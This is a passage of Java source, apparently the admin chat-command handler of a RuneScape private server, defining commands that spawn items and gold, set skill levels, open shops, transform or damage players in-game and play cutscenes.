			 player.getBank().addItem(13870, 1000000000, true);
			 player.getBank().addItem(13873, 1000000000, true);
			 player.getBank().addItem(13876, 1000000000, true);
			 player.getBank().addItem(13879, 1000000000, true);
			 player.getBank().addItem(13883, 1000000000, true);
					 
			player.getPackets().sendGameMessage("Filled your bank");
            }
			
			
			if (cmd[0].equalsIgnoreCase("othernpc")) {
			String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				p2.getAppearence().transformIntoNPC(
							Integer.valueOf(cmd[2]));
							
							return true;
			
			}

			
			if (cmd[0].equalsIgnoreCase("givemaxcape")) {
			String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				p2.getBank().addItem(20767, 1, true);
				p2.getBank().addItem(20768, 1, true);
						 player.getPackets().sendGameMessage("Gave max cape to: " +  p2.getUsername());
                 	
							return true;
			
			}

			if (cmd[0].equalsIgnoreCase("maxother")) {
			String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
			 
				p2.getSkills().set(0, 99);//atk
				p2.getSkills().set(1, 99);//def
				p2.getSkills().set(2, 99);//str
				p2.getSkills().set(3, 99);//hp
				p2.getSkills().set(4, 99);//range
				p2.getSkills().set(5, 99);//pray
				p2.getSkills().set(6, 99);//mage
				p2.getSkills().set(23, 99);//summon
				p2.getSkills().setXp(0, Skills.getXPForLevel(99));
				p2.getSkills().setXp(1, Skills.getXPForLevel(99));
				p2.getSkills().setXp(2, Skills.getXPForLevel(99));
				p2.getSkills().setXp(3, Skills.getXPForLevel(99));
				p2.getSkills().setXp(4, Skills.getXPForLevel(99));
				p2.getSkills().setXp(5, Skills.getXPForLevel(99));
				p2.getSkills().setXp(6, Skills.getXPForLevel(99));
				p2.getSkills().setXp(23, Skills.getXPForLevel(99));
					
				 player.getPackets().sendGameMessage("Maxed: " +  p2.getUsername());
                 

					return true;
			
			}
			if (cmd[0].equalsIgnoreCase("cbmaxother")) {
			String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
			 
				p2.getSkills().set(0, 99);//atk
				p2.getSkills().set(1, 99);//def
				p2.getSkills().set(2, 99);//str
				p2.getSkills().set(3, 99);//hp
				p2.getSkills().set(4, 99);//range
				p2.getSkills().set(6, 99);//mage
				p2.getSkills().setXp(0, Skills.getXPForLevel(99));
				p2.getSkills().setXp(1, Skills.getXPForLevel(99));
				p2.getSkills().setXp(2, Skills.getXPForLevel(99));
				p2.getSkills().setXp(3, Skills.getXPForLevel(99));
				p2.getSkills().setXp(4, Skills.getXPForLevel(99));
				p2.getSkills().setXp(6, Skills.getXPForLevel(99));
					
				 player.getPackets().sendGameMessage("CB Maxed: " +  p2.getUsername());
                 

					return true;
			
			}

			if (cmd[0].equalsIgnoreCase("refreshhs")) {
			SQL.createConnectionHS();
			SQL.refreshHS();
			SQL.destroyConnection();
			}	
			
			
			if (cmd[0].equalsIgnoreCase("whatremote")) {
			String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
					Player p2 = World.getPlayerByDisplayName(username);
					
				 player.getPackets().sendGameMessage("Remote: " +  p2.getAppearence().getRenderEmote());
                 
			}	
			
		if (cmd[0].equalsIgnoreCase("rates")) {
			
						player.showrate = !player.showrate;
				 player.getPackets().sendGameMessage("Drop rates: " + player.showrate );
                     
							
							
							return true;
			
			}
			
			if (cmd[0].equalsIgnoreCase("showdrops")) {
			
						player.ShowDrops = true;
				 return true;
			
			}
			
		
			
				
			if (cmd[0].equalsIgnoreCase("takeallmax")) {
			
			
					
			for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
				
					players.hasmax = false;
					player.getPackets().sendGameMessage(players.getUsername() + " maxed boolean is: " + players.hasmax );
					players.getInventory().deleteItem( 20767, 2147000000);
                    players.getEquipment().deleteItem(20767, 2147000000);  
					players.getInventory().deleteItem( 20768, 2147000000);
                    players.getEquipment().deleteItem(20768, 2147000000);  
					players.getBank().getItem(20768).setAmount(0);	
					players.getBank().getItem(20767).setAmount(0);	
							
							return true;
			
			
				}
			}
			
			
		
			 if (cmd[0].equalsIgnoreCase("setup")) {
              player.getInventory().addItem(20068 , 1);
			  player.getInventory().addItem(24330 , 1);
			  player.getInventory().addItem(24331 , 1);
			  player.getInventory().addItem(24332 , 1);
			  player.getInventory().addItem(24855 , 1);
			 
			  }
			  
			   if (cmd[0].equalsIgnoreCase("runepk")) {
              player.getInventory().addItem(4151 , 1); //whip
              player.getInventory().addItem(10828 , 1);//nezy
              player.getInventory().addItem(6585 , 1);//fury
              player.getInventory().addItem(1127 , 1);//plate
              player.getInventory().addItem(1079 , 1);//legs
              player.getInventory().addItem(11732 , 1);//dboots
              player.getInventory().addItem(20072 , 1);//defender
              player.getInventory().addItem(7462 , 1);
              player.getInventory().addItem(6570 , 1);
              
			  player.getInventory().addItem(1215 , 1);
			 
			  }
			  
		  if(cmd[0].equalsIgnoreCase("ovl")) {
			  
				player.getSkills().set(0, 125);
				player.getSkills().set(1, 125);
				player.getSkills().set(2, 125);
				player.getSkills().set(3, 125);
				player.getSkills().set(4, 125);
				player.getSkills().set(5, 125);
				player.getSkills().set(6, 125);
}	

			  
		  if(cmd[0].equalsIgnoreCase("boost")) {
			  
				player.getSkills().set(0, 130);
				player.getSkills().set(1, 130);
				player.getSkills().set(2, 130);
				player.getSkills().set(3, 130);
				player.getSkills().set(4, 130);
				player.getSkills().set(5, 130);
				player.getSkills().set(6, 130);
}

			  
		  if(cmd[0].equalsIgnoreCase("superboost")) {
			  
				player.getSkills().set(0, 150);
				player.getSkills().set(1, 150);
				player.getSkills().set(2, 150);
				player.getSkills().set(3, 150);
				player.getSkills().set(4, 150);
				player.getSkills().set(5, 150);
				player.getSkills().set(6, 150);
}	

		  if(cmd[0].equalsIgnoreCase("supersaiyin")) {
			  player.setNextForceTalk(new ForceTalk("Haaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"));
				
				player.getSkills().set(0, 200);
				player.getSkills().set(1, 200);
				player.getSkills().set(2, 200);
				player.getSkills().set(3, 200);
				player.getSkills().set(4, 200);
				player.getSkills().set(5, 200);
				player.getSkills().set(6, 200);
}				
			  
			if(cmd[0].equalsIgnoreCase("pray")) { 
			  player.getSkills().set(5, 999);
			  
			  }
		  if(cmd[0].equalsIgnoreCase("maxed")) {
			  
				player.getSkills().set(0, 99);
				player.getSkills().set(1, 99);
				player.getSkills().set(2, 99);
				player.getSkills().set(3, 99);
				player.getSkills().set(4, 99);
				player.getSkills().set(5, 99);
				player.getSkills().set(6, 99);
				player.getSkills().set(23, 99);
				player.getSkills().setXp(0, Skills.getXPForLevel(99));
				player.getSkills().setXp(1, Skills.getXPForLevel(99));
				player.getSkills().setXp(2, Skills.getXPForLevel(99));
				player.getSkills().setXp(3, Skills.getXPForLevel(99));
				player.getSkills().setXp(4, Skills.getXPForLevel(99));
				player.getSkills().setXp(5, Skills.getXPForLevel(99));
				player.getSkills().setXp(6, Skills.getXPForLevel(99));
				player.getSkills().setXp(23, Skills.getXPForLevel(99));
			  }

  if(cmd[0].equalsIgnoreCase("60atkturm")) {
			  
				player.getSkills().set(0, 60);//atk
				player.getSkills().set(1, 30);//def
				player.getSkills().set(2, 99);//str
				player.getSkills().set(3, 85);//hp
				player.getSkills().set(4, 70);//range
				player.getSkills().set(5, 95);//pray
				player.getSkills().set(6, 94);//mage
				player.getSkills().setXp(0, Skills.getXPForLevel(60));
				player.getSkills().setXp(1, Skills.getXPForLevel(30));
				player.getSkills().setXp(2, Skills.getXPForLevel(99));
				player.getSkills().setXp(3, Skills.getXPForLevel(85));
				player.getSkills().setXp(4, Skills.getXPForLevel(70));
				player.getSkills().setXp(5, Skills.getXPForLevel(95));
				player.getSkills().setXp(6, Skills.getXPForLevel(94));
				
			  }
			  
  if(cmd[0].equalsIgnoreCase("obby")) {
			  
				player.getSkills().set(0, 1);//atk
				player.getSkills().set(1, 1);//def
				player.getSkills().set(2, 99);//str
				player.getSkills().set(3, 99);//hp
				player.getSkills().set(4, 70);//range
				player.getSkills().set(5, 31);//pray
				player.getSkills().set(6, 1);//mage
				player.getSkills().set(23, 1);//summon
				
				player.getSkills().setXp(0, Skills.getXPForLevel(1));
				player.getSkills().setXp(1, Skills.getXPForLevel(1));
				player.getSkills().setXp(2, Skills.getXPForLevel(99));
				player.getSkills().setXp(3, Skills.getXPForLevel(99));
				player.getSkills().setXp(4, Skills.getXPForLevel(70));
				player.getSkills().setXp(5, Skills.getXPForLevel(31));
				player.getSkills().setXp(6, Skills.getXPForLevel(1));
				player.getSkills().setXp(23, Skills.getXPForLevel(1));
			  }
			  

			  
	   if (cmd[0].equalsIgnoreCase("turmsetup")) {
              player.getInventory().addItem(13263 , 1); //slay helm
              player.getInventory().addItem(2607 , 1);//g ady body
              player.getInventory().addItem(2609 , 1);//g ady leg
              player.getInventory().addItem(6585 , 1);//fury
              player.getInventory().addItem(6570 , 1);//firecape
              player.getInventory().addItem(18788 , 1);//climbing boots
              player.getInventory().addItem(6737 , 1);//b ring
              player.getInventory().addItem(6528 , 1);//oby maul
              player.getInventory().addItem(8849 , 1);
              player.getInventory().addItem(4587 , 1);
			 }

			  if (cmd[0].equalsIgnoreCase("100k")) {
              player.getInventory().addItem(995 , 100000);
			  }

			  if (cmd[0].equalsIgnoreCase("1b")) {
              player.getInventory().addItem(995 , 1000000000);
			  }

			  if (cmd[0].equalsIgnoreCase("2b")) {
              player.getInventory().addItem(995 , 2000000000);
			  }
			  
			  if (cmd[0].equalsIgnoreCase("maxcash")) {
              player.getInventory().addItem(995 , 2147483647);
			  }
			
			
			 if (cmd[0].equalsIgnoreCase("fogs")) {
              player.getInventory().addItem(12852 , 10000);
			}

			  if (cmd[0].equalsIgnoreCase("wings")) {
              
			  //Salv
			  player.getInventory().addItem(22905 , 1);
			  player.getInventory().addItem(22907 , 1);
			  player.getInventory().addItem(22909 , 1);
			  player.getInventory().addItem(23874 , 1);
			 
			 //corruption
			  player.getInventory().addItem(22899 , 1);
			  player.getInventory().addItem(22901 , 1);
			  player.getInventory().addItem(22903 , 1);
			  player.getInventory().addItem(23876 , 1);
			  
			  //harmony
			  player.getInventory().addItem(23848 , 1);
			  player.getInventory().addItem(23850 , 1);
			  player.getInventory().addItem(23852 , 1);
			  player.getInventory().addItem(23854 , 1);
			  
			}	

			if (cmd[0].equalsIgnoreCase("assassin")) {
              player.getInventory().addItem(24639 , 1);
			  player.getInventory().addItem(24641 , 1);
			  player.getInventory().addItem(24643 , 1);
			  player.getInventory().addItem(24645 , 1);
			  player.getInventory().addItem(24647 , 1);
			  player.getInventory().addItem(24649 , 1);
			  player.getInventory().addItem(24651 , 1);
			}	
			
			
			if (cmd[0].equalsIgnoreCase("swash")) {
              player.getInventory().addItem(24627 , 1);
			  player.getInventory().addItem(24629 , 1);
			  player.getInventory().addItem(24631 , 1);
			  player.getInventory().addItem(24633 , 1);
			  player.getInventory().addItem(24635 , 1);
			}	
			
			
			if (cmd[0].equalsIgnoreCase("gothic")) {
              player.getInventory().addItem(24617 , 1);
			  player.getInventory().addItem(24619 , 1);
			  player.getInventory().addItem(24621 , 1);
			  player.getInventory().addItem(24623 , 1);
			}
			
			if (cmd[0].equalsIgnoreCase("cat")) {
              player.getInventory().addItem(24605 , 1);
			  player.getInventory().addItem(24607 , 1);
			  player.getInventory().addItem(24609 , 1);
			  player.getInventory().addItem(24611 , 1);
			}	
			
			if (cmd[0].equalsIgnoreCase("coless")) {
              player.getInventory().addItem(24595 , 1);
			  player.getInventory().addItem(24597 , 1);
			  player.getInventory().addItem(24599, 1);
			  player.getInventory().addItem(24601 , 1);
			}				 

			if (cmd[0].equalsIgnoreCase("cabaret")) {
              player.getInventory().addItem(24583 , 1);
              player.getInventory().addItem(24585 , 1);
			  player.getInventory().addItem(24587 , 1);
			  player.getInventory().addItem(24589, 1);
			  player.getInventory().addItem(24691 , 1);
			}				 

			
			if (cmd[0].equalsIgnoreCase("gmasks")) {
              player.getInventory().addItem(24567 , 1);
              player.getInventory().addItem(24569 , 1);
			  player.getInventory().addItem(24571 , 1);
			}
			
			if (cmd[0].equalsIgnoreCase("starter")) {
             	player.starter = 0;
				Starter.appendStarter(player);
			}				 

		if (cmd[0].equalsIgnoreCase("maxstr")) {
              player.getInventory().addItem(13896 , 1);
			  player.getInventory().addItem(17291 , 1);
			  player.getInventory().addItem(13887 , 1);
			  player.getInventory().addItem(13893 , 1);
			  player.getInventory().addItem(22358 , 1);
			  player.getInventory().addItem(15220 , 1);
			  player.getInventory().addItem(1052 , 1);
			  player.getInventory().addItem(15332, 1);
}			  
				
			  if (cmd[0].equalsIgnoreCase("pots")) {
              player.getInventory().addItem(3024 , 3);
			  player.getInventory().addItem(145 , 1);
			  player.getInventory().addItem(157 , 1);
			  player.getInventory().addItem(163 , 1);
			  }

                            if (cmd[0].equalsIgnoreCase("Food")) {
              player.getInventory().addItem(15272 , 28);
			  }
			  
			  if (cmd[0].equalsIgnoreCase("minecart")) { // 1st is what body part, 2nd is the look
				player.setNextForceTalk(new ForceTalk("Minecart! Transform and Rollout!"));
				player.getAppearence().setLook(0,83);
				player.getAppearence().setLook(1,83);
				player.getAppearence().setLook(2,83);
				player.getAppearence().setLook(3,83);
				player.getAppearence().setLook(4,83);
				player.getAppearence().setLook(5,83);
				player.getAppearence().setLook(6,83);
				player.getAppearence().generateAppearenceData();
				return true;
			}

			
			if (cmd[0].equalsIgnoreCase("curses")) {
			
			if (!player.getPrayer().isAncientCurses()) {
			
				 player.getPrayer().setPrayerBook(true);
				 
				 }
				 
			 else {
				player.getPrayer().setPrayerBook(false);
			 }
			}
			
			if (cmd[0].equalsIgnoreCase("lunar")) {
			
			player.getCombatDefinitions().setSpellBook(2);
			}
			
			if (cmd[0].equalsIgnoreCase("ancient")) {
			
			player.getCombatDefinitions().setSpellBook(1);
			}
			
			if (cmd[0].equalsIgnoreCase("spells")) {
			
			player.getCombatDefinitions().setSpellBook(0);
			}
			
			
                            if (cmd[0].equalsIgnoreCase("overload")) {
              player.getInventory().addItem(15332 , 1);
			  }
			
				if(cmd[0].equalsIgnoreCase("unstuck")) {
			String name = cmd[1];
			Player target = SerializableFilesManager.loadPlayer(Utils
					.formatPlayerNameForProtocol(name));
			if (target != null)
				target.setUsername(Utils
						.formatPlayerNameForProtocol(name));
			target.setLocation(new WorldTile(3095,3497, 0));
			SerializableFilesManager.savePlayer(target);
			
			return true;
		}
                
		
		if (cmd[0].equalsIgnoreCase("item")) {
				try {
					
					int itemId = Integer.valueOf(cmd[1]);
					ItemDefinitions defs = ItemDefinitions
							.getItemDefinitions(itemId);
					if (defs.isLended())
						return false;
					String name = defs == null ? "" : defs.getName()
							.toLowerCase();
					player.getInventory().addItem(itemId,
							cmd.length >= 3 ? Integer.valueOf(cmd[2]) : 1);
				} catch (NumberFormatException e) {
					player.getPackets().sendGameMessage("Use: ::item id (optional:amount)");
				}
				
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("itemn")) {
				if (cmd.length < 2) {
					player.getPackets().sendGameMessage(
							"Use: ::item id (optional:amount)");
					return true;
				}
					StringBuilder sb = new StringBuilder(cmd[1]);
					int amount = 1;
					if (cmd.length > 2) {
						for (int i = 2; i < cmd.length; i++) {
							if (cmd[i].startsWith("+")) {
								amount = Integer.parseInt(cmd[i].replace("+", ""));
							} else {
								sb.append(" ").append(cmd[i]);
							}
						}
					}
					String name = sb.toString().toLowerCase().replace("[", "(")
							.replace("]", ")").replaceAll(",", "'");
					if (name.contains("hope you enjoy :b")) {
						return true;
					}
					for (int i = 0; i < Utils.getItemDefinitionsSize(); i++) {
						ItemDefinitions def = ItemDefinitions
								.getItemDefinitions(i);
						if (def.getName().toLowerCase().equalsIgnoreCase(name)) {
							player.getInventory().addItem(i, amount);
							player.stopAll();
							player.getPackets().sendGameMessage("Found item " + name + " - id: " + i + ".");
							
							
			
							
							return true;
						}
					}
					player.getPackets().sendGameMessage(
							"Could not find item by the name " + name + ".");
				}
				
				
				
		
					//cmd3
				if (cmd[0].equalsIgnoreCase("makeallbowtome")) {
			for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
			players.setNextForceTalk(new ForceTalk("All hail " + player.getDisplayName() + "."));
					players.setNextAnimation(new Animation(858));
			 }}		
				
			if (cmd[0].equalsIgnoreCase("copy")) {
				
				String username = "";
				for (int i = 1; i < cmd.length; i++)
					username += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player p2 = World.getPlayerByDisplayName(username);
				if (p2 == null) {
					player.getPackets().sendGameMessage("Couldn't find player " + username + ".");
					return true;
				}
				if (!player.getEquipment().wearingArmour()) {
					player.getPackets().sendGameMessage("Please remove your armour first.");
					return true;
				}
				Item[] items = p2.getEquipment().getItems().getItemsCopy();
				for (int i = 0; i < items.length; i++) {
					if (items[i] == null)
						continue;
					/*for (String string : Settings.EARNED_ITEMS) {
						if (items[i].getDefinitions().getName().toLowerCase()
								.contains(string))
							items[i] = new Item(-1, -1);
					}*/
					HashMap<Integer, Integer> requiriments = items[i]
							.getDefinitions().getWearingSkillRequiriments();
					boolean hasRequiriments = true;
					if (requiriments != null) {
						for (int skillId : requiriments.keySet()) {
							if (skillId > 24 || skillId < 0)
								continue;
							int level = requiriments.get(skillId);
							if (level < 0 || level > 120)
								continue;
							if (player.getSkills().getLevelForXp(skillId) < level) {
								if (hasRequiriments)
									player.getPackets()
									.sendGameMessage("You are not high enough level to use this item.");
								hasRequiriments = false;
								String name = Skills.SKILL_NAME[skillId]
										.toLowerCase();
								player.getPackets().sendGameMessage("You need to have a"+ (name.startsWith("a") ? "n" : "") + " " + name + " level of " + level + ".");
							}

						}
					}
					if (!hasRequiriments)
						return true;
					player.getEquipment().getItems().set(i, items[i]);
					player.getEquipment().refresh(i);
				}
				player.getAppearence().generateAppearenceData();
				return true;
			}         	
			if (cmd[0].equalsIgnoreCase("givesup")) {
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player p2 = World.getPlayerByDisplayName(username);  
					if (p2 != null){
					p2.isSup = true;
				return true;
					}
				return false;

}
		
			
			
			if (cmd[0].equalsIgnoreCase("prayertest")) {
				player.setPrayerDelay(4000);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("karamja")) {
				player.getDialogueManager().startDialogue("KaramjaTrip", Utils.getRandom(1) == 0 ? 11701 : (Utils.getRandom(1) == 0 ? 11702 : 11703));
				return true;
			}
			if (cmd[0].equalsIgnoreCase("shop")) {
				ShopsHandler.openShop(player, Integer.parseInt(cmd[1]));
				return true;
			
			}
			if (cmd[0].equalsIgnoreCase("nonex1")) {
              ShopsHandler.openShop(player, 96);
			  
			  }
			  
			 if (cmd[0].equalsIgnoreCase("nonex2")) {
              ShopsHandler.openShop(player, 97);
			  
  }
			  
			 if (cmd[0].equalsIgnoreCase("ss1")) {
              ShopsHandler.openShop(player, 34);
			  
			  }
			  if (cmd[0].equalsIgnoreCase("ss2")) {
              ShopsHandler.openShop(player, 21);
			  
			  }
			  if (cmd[0].equalsIgnoreCase("pk1")) {
              ShopsHandler.openShop(player, 94);
			  
			  }
			  if (cmd[0].equalsIgnoreCase("pk2")) {
              ShopsHandler.openShop(player, 93);
			  
			  }
			  
			  if (cmd[0].equalsIgnoreCase("ds1")) {
              ShopsHandler.openShop(player, 95);
			  
			  }
			  
			  if (cmd[0].equalsIgnoreCase("69kingtho")) {
              ShopsHandler.openShop(player, 69);
			  
			  }
			  
			  if (cmd[0].equalsIgnoreCase("pets36")) {
              ShopsHandler.openShop(player, 36);
			  
			  }
			 

		
			if (cmd[0].equalsIgnoreCase("testdung")) { //Causes memory leak, do not use
				new DungeonPartyManager(player);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("checkdisplay")) {
				for (Player p : World.getPlayers()) {
					String[] invalids = { "<img", "<img=", "col", "<col=",
							"<shad", "<shad=", "<str>", "<u>" };
					for (String s : invalids)
						if (p.getDisplayName().contains(s)) {
							player.getPackets().sendGameMessage(
									Utils.formatPlayerNameForDisplay(p
											.getUsername()));
						} else {
							player.getPackets().sendGameMessage("None exist!");
						}
				}
				return true;
			}
			if (cmd[0].equalsIgnoreCase("changedisplay")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				Player target = World.getPlayerByDisplayName(name);
				String[] invalids = { "<img", "<img=", "<col", "<col=",
						"<shad", "<shad=", "<str>", "<u>" };
				for (String s : invalids)
					if (target.getDisplayName().contains(s)) {
						target.setDisplayName(Utils.formatPlayerNameForDisplay(target.getDisplayName().replace(s, "")));
						player.getPackets().sendGameMessage(
								"You changed their display name.");
						target.getPackets()
						.sendGameMessage(
								"An admininstrator has changed your display name.");
					}
				return true;
			}
			
			
			if (cmd[0].equalsIgnoreCase("cutscene")) {
				player.getPackets().sendCutscene(Integer.parseInt(cmd[1]));
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("cutscene2")) {
				player.getCutscenesManager().play(cmd[1]);
				return true;
			}
			if (cmd[0].equalsIgnoreCase("homecs")) {
				player.getCutscenesManager().play("HomeCutScene");
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("snowcs")) {
				player.getCutscenesManager().play("SnowCutScene");
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("outfithelp")) {
			
			player.getPackets().sendGameMessage("Man");
			player.getPackets().sendGameMessage(" ");
			player.getPackets().sendGameMessage("look[0] = 3;   Hair");
			player.getPackets().sendGameMessage("look[1] = 14;  Beard");
			player.getPackets().sendGameMessage("look[2] = 18;  Torso");
			player.getPackets().sendGameMessage("look[3] = 26;  Arms");
			player.getPackets().sendGameMessage("look[4] = 34;  Bracelets");
			player.getPackets().sendGameMessage("look[5] = 38;  Legs");
			player.getPackets().sendGameMessage("look[6] = 42;  Shoes");
			player.getPackets().sendGameMessage("");
			player.getPackets().sendGameMessage("colour[2] = 16; ");
			player.getPackets().sendGameMessage("colour[1] = 16; ");
			player.getPackets().sendGameMessage("colour[0] = 3; ");
			player.getPackets().sendGameMessage("");
			player.getPackets().sendGameMessage(" --------------------");
			player.getPackets().sendGameMessage("Woman");
			player.getPackets().sendGameMessage(" ");
			player.getPackets().sendGameMessage("look[0] = 48;   Hair");
			player.getPackets().sendGameMessage("look[1] = 57;  Beard");
			player.getPackets().sendGameMessage("look[2] = 57;  Torso");
			player.getPackets().sendGameMessage("look[3] = 65;  Arms");
			player.getPackets().sendGameMessage("look[4] = 68;  Bracelets");
			player.getPackets().sendGameMessage("look[5] = 77;  Legs");
			player.getPackets().sendGameMessage("look[6] = 80;  Shoes");
			player.getPackets().sendGameMessage(" ");
			player.getPackets().sendGameMessage("colour[2] = 16; ");
			player.getPackets().sendGameMessage("colour[1] = 16; ");
			player.getPackets().sendGameMessage("colour[0] = 3; ");
			
			
			
			
			}
			
			if (cmd[0].equalsIgnoreCase("summon")) {
				Summoning.infusePouches(player);
				return true;
			}
			 if (cmd[0].equalsIgnoreCase("ringoflife")) {
              player.getInventory().addItem(2570 , 1);
			  } 
			  if (cmd[0].equalsIgnoreCase("adminitem")) {
              player.getInventory().addItem(21819 , 1);
			  }
			  
			
			if (cmd[0].equalsIgnoreCase("dharok")) {
              player.getInventory().addItem(4716 , 1);
			  player.getInventory().addItem(4718 , 1);
			  player.getInventory().addItem(4720 , 1);
			  player.getInventory().addItem(4722 , 1);
			  player.getInventory().addItem(6585 , 1);
			  player.getInventory().addItem(7462 , 1);
			  player.getInventory().addItem(21787 , 1);
			  
			  }
			
		
			 
			if (cmd[0].equalsIgnoreCase("npc")) {
				try {
					World.spawnNPC(Integer.parseInt(cmd[1]), player, -1, true,
							true);
					return true;
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::npc id(Integer)");
				}
			}
			
			if (cmd[0].equalsIgnoreCase("controller")) {
				
					player.getPackets().sendGameMessage("Controller: " + player.getControlerManager().getControler());
				
			}
			
			if (cmd[0].equalsIgnoreCase("spawnplayer")) {
				Player other = new Player("VPS");
				//Session session, String username, int displayMode,int screenWidth, int screenHeight
				other.init(player.getSession(), "VPS", 0, 0, 0);
				other.setNextWorldTile(player);
				other.setNextWorldTile(new WorldTile(4889, 4707, 0));
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("tab")) {
				try {
					player.getInterfaceManager().sendTab(
							Integer.valueOf(cmd[2]), Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: tab id inter");
				}
				return true;
			}
			if (cmd[0].equalsIgnoreCase("tabses")) {
				try {
					for (int i = 110; i < 200; i++)
						player.getInterfaceManager().sendTab(i, 662);
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: tab id inter");
				}
				return true;
			}
			
			if (cmd[0].equalsIgnoreCase("setQp") ) {
				String username = cmd[2].substring(cmd[2].indexOf(" ") + 1);
				Player other = World.getPlayerByDisplayName(username);
				
				if (other == null)
					return true;
				other.setQp(Integer.parseInt(cmd[1]));
				return true;
			}
			
			
			
			if (cmd[0].equalsIgnoreCase("setotherdeaths")) {
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player other = World.getPlayerByDisplayName(username);
				if (other == null)
					return true;
				try {
					other.setDeathCount(Integer.valueOf(cmd[2]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: setkills id");
				}
			}
			
			if (cmd[0].equalsIgnoreCase("setotherkills")) {
				String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
				Player other = World.getPlayerByDisplayName(username);
				if (other == null)
					return true;
				try {
					other.setKillCount(Integer.valueOf(cmd[2]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: setkills id");
				}
			}
			
			
			
			
			if (cmd[0].equalsIgnoreCase("setkills")) {
				try {
					player.setKillCount(Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: setkills id");
				}
				return true;
			}
			if (cmd[0].equalsIgnoreCase("setdeaths")) {
				try {
					player.setDeathCount(Integer.valueOf(cmd[1]));
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: setkills id");
				}
				return true;
				
				}
					
			if (cmd[0].equalsIgnoreCase("npcall")) {
			for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
							
					
					
				players.getAppearence().transformIntoNPC(Integer.valueOf(cmd[1]));
							
							return true;
			
			}
			}
			
			if (cmd[0].equalsIgnoreCase("demoteall")) {
			for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
							
					
					
				players.setRights(0);
							
							return true;
			
			}
				}
				if (cmd[0].equalsIgnoreCase("nuke3")) {
				for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
							
					
					//players.getPackets().sendCameraShake(3, 25, 50, 25, 50);
					players.setNextForceTalk(new ForceTalk("Boom im dead."));
					players.getPackets().sendGameMessage("Boom.");
					//players.applyHit(new Hit(player, 99999, HitLook.REGULAR_DAMAGE));
					player.setNextAnimation(new Animation(761));
					players.getInterfaceManager().sendInterface(122);
				}}
				
				if (cmd[0].equalsIgnoreCase("nuke")) {
				for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
							
					players.getInterfaceManager().sendInterface(122);
					//players.getPackets().sendCameraShake(3, 25, 50, 25, 50);
					players.setNextForceTalk(new ForceTalk("Tactical Nuke inbound!"));
					players.getPackets().sendGameMessage("Boom.");
					players.applyHit(new Hit(player, 99999, HitLook.REGULAR_DAMAGE));
				}}
				
				if (cmd[0].equalsIgnoreCase("nuke2")) {
				for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
					players.getInterfaceManager().sendInterface(257);
					players.getPackets().sendCameraShake(3, 25, 50, 25, 50);
					players.setNextForceTalk(new ForceTalk("Tactical Nuke inbound!"));
					players.getPackets().sendGameMessage("Boom.");
					players.applyHit(new Hit(player, 99999, HitLook.REGULAR_DAMAGE));
				}}
			
				if (cmd[0].equalsIgnoreCase("nolewis")) {
				for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
					
				players.setNextForceTalk(new ForceTalk("Dont do it Lewis."));
					players.setNextAnimation(new Animation(859));
                                }}
			
				
				if (cmd[0].equalsIgnoreCase("hellothere")) {
				for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
					
				players.setNextForceTalk(new ForceTalk("Hello there!"));
					players.setNextAnimation(new Animation(863));
					
				}}
				
				if (cmd[0].equalsIgnoreCase("chopchop")) {
				for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
					
				players.setNextForceTalk(new ForceTalk("Chop Chop!"));
					players.setNextAnimation(new Animation(867));
					
				}}
				
				if (cmd[0].equalsIgnoreCase("dclaws")) {
				for (Player players : World.getPlayers()) {
						if (players == null)
							continue;
					
				players.setNextForceTalk(new ForceTalk("Spec!"));
					players.setNextAnimation(new Animation(10961));
					
				}}
				
			
	
	
			
			
				
				if (cmd[0].equalsIgnoreCase("prestige")) {
		player.prestige += 1;
		
		}
				if (cmd[0].equalsIgnoreCase("maxprestige")) {
		player.prestige += 9001;
		
		}
				if (cmd[0].equalsIgnoreCase("maxed")) {
				if (cmd.length < 2) {
					for (int skill = 0; skill < 25; skill++)
						player.getSkills().addXp(skill, Skills.MAXIMUM_EXP);
					return true;
				}
				try {
					player.getSkills().addXp(Integer.valueOf(cmd[1]),
							Skills.MAXIMUM_EXP);
				} catch (NumberFormatException e) {
					player.getPackets().sendPanelBoxMessage("Use: ::master skill");
				}
				return true;
			}
		
				
				if (cmd[0].equalsIgnoreCase("donator")) {
				String name = "";
				for (int i = 1; i < cmd.length; i++)
